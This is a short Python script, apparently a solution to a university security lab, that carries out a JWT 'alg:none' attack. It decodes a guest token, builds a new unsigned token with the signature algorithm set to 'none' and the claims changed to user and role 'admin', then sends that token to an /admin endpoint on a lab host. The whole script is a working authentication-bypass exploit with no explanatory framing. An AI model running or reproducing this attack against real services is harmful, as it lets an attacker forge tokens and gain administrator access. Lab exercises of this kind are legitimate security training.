import requests
import base64
import hashlib

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"
token2 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==."
header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
payload = "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9"
signature = "Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"

url = 'http://cns-test.idlab.uantwerpen.be:50009/admin'
def decode(base64_string):
    base64_bytes = base64_string.encode("ascii")

    sample_string_bytes = base64.urlsafe_b64decode(base64_bytes)
    sample_string = sample_string_bytes.decode("ascii")

    print(f"Decoded string: {sample_string}")

def encode(string):
    sample_string_bytes = string.encode("ascii")

    base64_bytes = base64.urlsafe_b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")

    print(f"Encoded string: {base64_string}")

decode(header)
decode(payload)
encode('{"alg":"none","typ":"JWT"}')
header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0="
encode('{"user":"admin","role":"admin"}')
payload = "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=="
decode(payload)
x = requests.get(url, headers={"Content-Type":"application/json","Authorization": f"Bearer {token2}"})

print(x.text)
